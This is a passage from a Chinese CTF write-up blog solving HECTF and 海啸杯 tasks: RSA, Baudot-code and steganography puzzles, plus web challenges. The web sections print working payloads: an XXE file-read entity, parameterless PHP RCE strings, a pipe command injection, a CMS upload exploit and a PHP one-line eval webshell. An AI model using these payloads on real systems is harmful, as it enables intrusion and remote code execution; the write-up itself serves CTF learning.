class="number">-1</span>) * (q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e, phi)</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(libnum.n2s(m))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;8fb873baba0df4a6423be9f4bd525d93&#125;</span><br></pre></td></tr></table></figure><br><h3 id="no-blank-space"><a href="#no-blank-space" class="headerlink" title="no blank space"></a>no blank space</h3><p>题目：出题人的电脑年久失修，空格键失灵了，你能找到电报里的秘密吗(注:flag内字母全部大写）   flag格式：HECTF{.+}</p><p>hint：试试别的电报码叭</p><p>hint：古老的5bit编码</p><ul><li>cipher.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.</span><br></pre></td></tr></table></figure><p><a href="https://blog.by24.cn/archives/character-encoding-baudot-code.html"><strong>博多码</strong></a></p><p>将<code>.</code>换成<code>1</code>，<code>-</code>换成<code>0</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">&#x27;.-.------.-...-.-----..-..----.-.--..-...-........--.-...-...-........--.-.-..--.----...--..-...-..-.....-.-.---.-...-..----.&#x27;</span>;</span><br><span class="line">$a = str_replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, $a);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10100000010111010000011011000010100110111011111111001011101110111111110010101100100001110011011101101111101010001011101100001</span><br></pre></td></tr></table></figure><p>用这个网站解码：<a href="https://www.boxentriq.com/code-breaking/baudot-code">Baudot Code, Baudot-Murray Code (online tool) | Boxentriq</a></p><p><img src="https://s3.ax1x.com/2020/11/26/D0J7Sf.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTFTH1S1SNTM0RS3</span><br></pre></td></tr></table></figure><p>整理下得到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HECTF&#123;TH1S1SNTM0RS3&#125;</span><br></pre></td></tr></table></figure><p>也可以一个一个对照解码</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/SywnzjKe8U58SVCRVHoDacZsHKyhtVKIcBasicyaIaYo0q5iafPeclgtZQeKAcHwaibLQHOwibWOiaT1J0saevG7acg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">10100H</span><br><span class="line">00001E</span><br><span class="line">01110C</span><br><span class="line">10000T</span><br><span class="line">01101F</span><br><span class="line">10000T</span><br><span class="line">10100H</span><br><span class="line">11011切换到数字</span><br><span class="line">101111</span><br><span class="line">11111切换到字母</span><br><span class="line">00101S</span><br><span class="line">11011切换到数字</span><br><span class="line">101111</span><br><span class="line">11111切换到字母</span><br><span class="line">00101S</span><br><span class="line">01100N</span><br><span class="line">10000T</span><br><span class="line">11100M</span><br><span class="line">11011切换到数字</span><br><span class="line">101100</span><br><span class="line">11111切换到字母</span><br><span class="line">01010R</span><br><span class="line">00101S</span><br><span class="line">11011切换到数字</span><br><span class="line">000013</span><br></pre></td></tr></table></figure><br><h3 id="希尔密码"><a href="#希尔密码" class="headerlink" title="希尔密码"></a>希尔密码</h3><p>题目：出题人想悄悄送给大家flag，flag就是HECTF{ezth……（糟糕,小哲哲师傅突然堵住了我的嘴</p><p>hint：已知部分明文，不如试试解出key叭</p><p>hint：hectf 原来这是五个字</p><ul><li>cipher.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdqsrppwuzzyjhwrhyzripfpxol</span><br></pre></td></tr></table></figure><p><strong>还没有wp</strong></p>]]></content>
      
      
      <categories>
          
          <category> 比赛writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届海啸杯 write up</title>
      <link href="2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF%20write%20up/"/>
      <url>2020/11/19/%E7%AC%AC%E4%B8%89%E5%B1%8A%E6%B5%B7%E5%95%B8%E6%9D%AF%20write%20up/</url>
      
        <content type="html"><![CDATA[<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="G2mtu学生"><a href="#G2mtu学生" class="headerlink" title="G2mtu学生?"></a>G2mtu学生?</h3><p><strong>X-Forwarded-For绕过、Cookie伪造</strong></p><p>用Burp Suite抓包，将<code>user=0</code>改为<code>user=1</code>，添加X-Forwarded-For:127.0.0.1</p><p><img src="https://s3.ax1x.com/2020/11/19/DunHr8.png" alt="DunHr8.png"></p><a id="more"></a><br><h3 id="Who-are-you？"><a href="#Who-are-you？" class="headerlink" title="Who are you？"></a>Who are you？</h3><p>用Burp suite抓包，发现</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;feedback&gt;&lt;author&gt;aaa&lt;/author&gt;&lt;/feedback&gt;</span><br></pre></td></tr></table></figure><p>好像是XXE漏洞，在书上查看攻击方式</p><p><img src="https://s3.ax1x.com/2020/11/19/DuuoFJ.jpg" alt="DuuoFJ.jpg"></p><p>尝试用php伪协议读取flag.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY b SYSTEM &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot; &gt;</span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">&lt;xml&gt;</span><br><span class="line">&lt;xxe&gt;&amp;b;&lt;/xxe&gt;</span><br><span class="line">&lt;/xml&gt;</span><br></pre></td></tr></table></figure><p>发现读不出来，跳转到根目录下读取也不行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=../../../../../../flag.php</span><br></pre></td></tr></table></figure><p>尝试读取index.php，读取成功，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmxpYnhtbF9kaXNhYmxlX2VudGl0eV9sb2FkZXIoZmFsc2UpOw0KJGRhdGEgPSBAZmlsZV9nZXRfY29udGVudHMoJ3BocDovL2lucHV0Jyk7DQokcmVzcCA9ICcnOw0KLy8kZmxhZz0nZmxhZ3s3OWQxMDYyNi1kMjdmLTQ1NjktYTYyOS1jOTYwNmQwMzc4ZjJ9JzsNCmlmKCRkYXRhICE9IGZhbHNlKXsNCiAgICAkZG9tID0gbmV3IERPTURvY3VtZW50KCk7DQogICAgJGRvbS0+bG9hZFhNTCgkZGF0YSwgTElCWE1MX05PRU5UKTsNCiAgICBvYl9zdGFydCgpOw0KICAgICRyZXMgID0gJGRvbS0+dGV4dENvbnRlbnQ7DQogICAgJHJlc3AgPSBvYl9nZXRfY29udGVudHMoKTsNCiAgICBvYl9lbmRfY2xlYW4oKTsNCiAgICBpZiAoJHJlcyl7DQogICAgICAgIGRpZSgkcmVzKTsNCiAgICB9DQoNCn0NCj8+DQo8IURPQ1RZUEUgaHRtbD4NCjxodG1sIGxhbmc9ImVuIj4NCjxoZWFkPg0KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4NCiAgICA8dGl0bGU+d2VsY29tZTwvdGl0bGU+DQogICAgPGxpbmsgcmVsPSJzdHlsZXNoZWV0IiBocmVmPSIuL3N0eWxlLmNzcyI+DQogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAiPg0KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iaWU9ZWRnZSI+DQoNCjwvaGVhZD4NCjxib2R5IGNsYXNzPSJjb250YWN0Qm9keSI+DQo8ZGl2IGNsYXNzPSJ3cmFwcGVyIj4NCiAgICA8ZGl2IGNsYXNzPSJ0aXRsZSI+DQoNCg0KICAgIDwvZGl2Pg0KDQoNCiAgICA8Zm9ybSBtZXRob2Q9InBvc3QiIGNsYXNzPSJmb3JtIj4NCiAgICAgICAgPGgxIGlkPSJ0aXRsZSI+6K+36L6T5YWl5aeT5ZCNPC9oMT4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGJyLz4NCiAgICAgICAgPGlucHV0IHR5cGU9InRleHQiIGNsYXNzPSJuYW1lIGVudHJ5ICIgaWQ9Im5hbWUiIG5hbWU9Im5hbWUiIHBsYWNlaG9sZGVyPSJZb3VyIE5hbWUiLz4NCiAgICA8L2Zvcm0+DQogICAgPGJ1dHRvbiBjbGFzcz0ic3VibWl0IGVudHJ5IiBvbmNsaWNrPSJmdW5jKCkiPlN1Ym1pdDwvYnV0dG9uPg0KDQogICAgPGRpdiBjbGFzcz0ic2hhZG93Ij48L2Rpdj4NCjwvZGl2Pg0KDQo8L2JvZHk+DQo8L2h0bWw+DQo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQogICAgZnVuY3Rpb24gcGxheSgpIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICBmdW5jdGlvbiBmdW5jKCkgew0KICAgICAgICAvLyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgpLnZhbHVlDQogICAgICAgIHZhciB4bWwgPSAnJyArDQogICAgICAgICAgICAnPFw&#x2F;eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ilw&#x2F;PicgKw0KICAgICAgICAgICAgJzxmZWVkYmFjaz4nICsNCiAgICAgICAgICAgICc8YXV0aG9yPicgKyBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbmFtZScpLnZhbHVlKyAnPC9hdXRob3I+JyArDQogICAgICAgICAgICAnPC9mZWVkYmFjaz4nOw0KICAgICAgICBjb25zb2xlLmxvZyh4bWwpOw0KICAgICAgICB2YXIgeG1saHR0cCA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOw0KICAgICAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uICgpIHsNCiAgICAgICAgICAgIGlmICh4bWxodHRwLnJlYWR5U3RhdGUgPT0gNCkgew0KICAgICAgICAgICAgICAgIC8vIGNvbnNvbGUubG9nKHhtbGh0dHAucmVhZHlTdGF0ZSk7DQogICAgICAgICAgICAgICAgLy8gY29uc29sZS5sb2coeG1saHR0cC5yZXNwb25zZVRleHQpOw0KICAgICAgICAgICAgICAgIHZhciByZXMgPSB4bWxodHRwLnJlc3BvbnNlVGV4dDsNCiAgICAgICAgICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndGl0bGUnKS50ZXh0Q29udGVudCA9IHJlcw0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0KICAgICAgICB4bWxodHRwLm9wZW4oIlBPU1QiLCAiaW5kZXgucGhwIiwgdHJ1ZSk7DQogICAgICAgIHhtbGh0dHAuc2VuZCh4bWwpOw0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfTsNCjwvc2NyaXB0Pg0KPC9ib2R5Pg0KPC9odG1sPg&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>用base64解密，得到源码，flag就在源码里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line">$data = @file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$resp = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="comment">//$flag=&#x27;flag&#123;79d10626-d27f-4569-a629-c9606d0378f2&#125;&#x27;;</span></span><br><span class="line"><span class="keyword">if</span>($data != <span class="literal">false</span>)&#123;</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($data, LIBXML_NOENT);</span><br><span class="line">    ob_start();</span><br><span class="line">    $res  = $dom-&gt;textContent;</span><br><span class="line">    $resp = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">if</span> ($res)&#123;</span><br><span class="line">        <span class="keyword">die</span>($res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;welcome&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">&quot;stylesheet&quot;</span> href=<span class="string">&quot;./style.css&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body class=&quot;contactBody&quot;&gt;</span><br><span class="line">&lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;title&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;form method=&quot;post&quot; class=&quot;form&quot;&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;title&quot;</span>&gt;è¯·è¾å¥å§å&lt;/h1&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;br/&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; class=&quot;name entry &quot; id=&quot;name&quot; name=&quot;name&quot; placeholder=&quot;Your Name&quot;/&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;button class=&quot;submit entry&quot; onclick=&quot;func()&quot;&gt;Submit&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class=&quot;shadow&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">play</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// document.getElementById().value</span></span><br><span class="line">        <span class="keyword">var</span> xml = <span class="string">&#x27;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;\?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;\?&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;feedback&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;author&gt;&#x27;</span> + document.getElementById(<span class="string">&#x27;name&#x27;</span>).value+ <span class="string">&#x27;&lt;/author&gt;&#x27;</span> +</span><br><span class="line">            <span class="string">&#x27;&lt;/feedback&gt;&#x27;</span>;</span><br><span class="line">        console.log(xml);</span><br><span class="line">        <span class="keyword">var</span> xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">        xmlhttp.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (xmlhttp.readyState == <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="comment">// console.log(xmlhttp.readyState);</span></span><br><span class="line">                <span class="comment">// console.log(xmlhttp.responseText);</span></span><br><span class="line">                <span class="keyword">var</span> res = xmlhttp.responseText;</span><br><span class="line">                document.getElementById(<span class="string">&#x27;title&#x27;</span>).textContent = res</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xmlhttp.open(<span class="string">&quot;POST&quot;</span>, <span class="string">&quot;index.php&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        xmlhttp.send(xml);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><h3 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag in flag.php</span></span><br><span class="line">$a=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>])) &#123;    </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/ses|pos|end|next|name|chdir|var|impolode|tan|tall|sys|eval|var|high|show|read|base|url|print/&quot;</span>, $_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no !&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;\$a=&quot;</span>.$_GET[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/flag/&#x27;</span>, $a))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span>($a);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>利用SESSIONID来传参，读取flag</p><p><img src="https://s3.ax1x.com/2020/11/19/DuQkdS.png" alt="DuQkdS.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;Show_source(Session_id(Session_start()));</span><br><span class="line">PHPSESSID&#x3D;flag.php</span><br></pre></td></tr></table></figure><br><p>或者：</p><p>用scandir()读取目录源码，但必须带有参数（’.’），无法通过正则匹配</p><p>用pos()取localeconv()返回的数组的第一个元素，也就是”.”</p><p>但pos()被过滤了，用current()替换，print_r也被过滤了，尝试用大写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;Print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Array ( [0] &#x3D;&gt; . [1] &#x3D;&gt; .. [2] &#x3D;&gt; admin.php [3] &#x3D;&gt; flag.php [4] &#x3D;&gt; hahaha.php [5] &#x3D;&gt; index.php ) 1 </span><br></pre></td></tr></table></figure><p>hint：反转，随机数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?code&#x3D;Var_dump(Readfile(array_rand(array_flip(scandir(Pos(localeconv()))))));</span><br></pre></td></tr></table></figure><p>一直刷新，直到看到<code>int(55)</code>，查看源码也可以看到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">readfile()   输出一个文件</span><br><span class="line">array_rand()   函数返回数组中的随机键名，或者如果规定函数返回不只一个键名，则返回包含随机 键名的数组。 </span><br><span class="line">array_flip()   函数用于反转&#x2F;交换数组中所有的键名以及它们关联的键值。</span><br></pre></td></tr></table></figure><br><h3 id="神奇的登录框"><a href="#神奇的登录框" class="headerlink" title="神奇的登录框"></a>神奇的登录框</h3><p>看了宇豪师兄的博客：<a href="https://www.getflag.cn/2020/11/10/%E6%B5%85%E8%B0%88ctf%E4%B8%AD%E6%97%A0%E5%9B%9E%E6%98%BE/">浅谈ctf中无回显</a>，才知道怎么做</p><ul><li>|ls &gt; 1.txt</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.txt</span><br><span class="line">flagggg.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure><ul><li>|cat flagggg.php &gt; 2.txt</li></ul><p><img src="https://s3.ax1x.com/2020/11/19/DuUbU1.png" alt="DuUbU1.png"></p><br><h3 id="cms"><a href="#cms" class="headerlink" title="cms"></a>cms</h3><p>参考：<a href="https://www.cnblogs.com/r00tuser/p/8000508.html">[代码审计]XiaoCms（后台任意文件上传至getshell,任意目录删除,会话固定漏洞</a></p><p>管理员账号：admin</p><p>密码：admin8888</p><br><p>在管理员后台新建表单</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;http:&#x2F;&#x2F;129.204.81.127:6333&#x2F;admin&#x2F;index.php?c&#x3D;uploadfile&amp;a&#x3D;uploadify_upload&amp;type&#x3D;php&amp;size&#x3D;1000&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/Dua7QS.png" alt="Dua7QS.png"></p><p>上传一句话木马</p><ul><li>test3.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/DuaXon.png" alt="DuaXon.png"></p><p>点击提交，得到文件路径</p><p><code>http://129.204.81.127:6333/data/upload/file/202011/28022b121a56bd7461ecdb38db70cd1f.php</code></p><p>用蚁剑打开，密码为cmd，在文件根目录下找到flag</p><br><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>用010editor打开，修改图片高度，就可以看到flag</p><p><img src="https://s3.ax1x.com/2020/11/19/Dudbp6.png" alt="Dudbp6.png"></p><br><h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>将<code>cxk.jpg</code>拖到kali，提取隐藏文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -e cxk.jpg</span><br></pre></td></tr></table></figure><p>得到<code>flag.png</code>，用ps水平翻转，就可以看清楚flag</p><p><img src="https://s3.ax1x.com/2020/11/19/Duw8uF.png" alt="Duw8uF.png"></p><br><h3 id="lsb"><a href="#lsb" class="headerlink" title="lsb"></a>lsb</h3><p>LSB隐写，用Stegsolve打开，点Analyse-Data Extract</p><p><img src="https://s3.ax1x.com/2020/11/19/Duwj2V.png" alt="Duwj2V.png"></p><p>点击Save Bin 保存为1.png，是一张二维码，扫码就可以得到flag</p><br><h3 id="你能破解吗"><a href="#你能破解吗" class="headerlink" title="你能破解吗?"></a>你能破解吗?</h3><p>hint：压缩包密码为g2mtu加四位数字</p><p>生成密码字典</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file = open(<span class="string">&quot;1.dic&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">file.write(<span class="string">&quot;g2mtu&quot;</span>+str(i)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p><img src="https://s3.ax1x.com/2020/11/19/DuDcE4.png" alt="DuDcE4.png"></p><p>解压得到flag.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 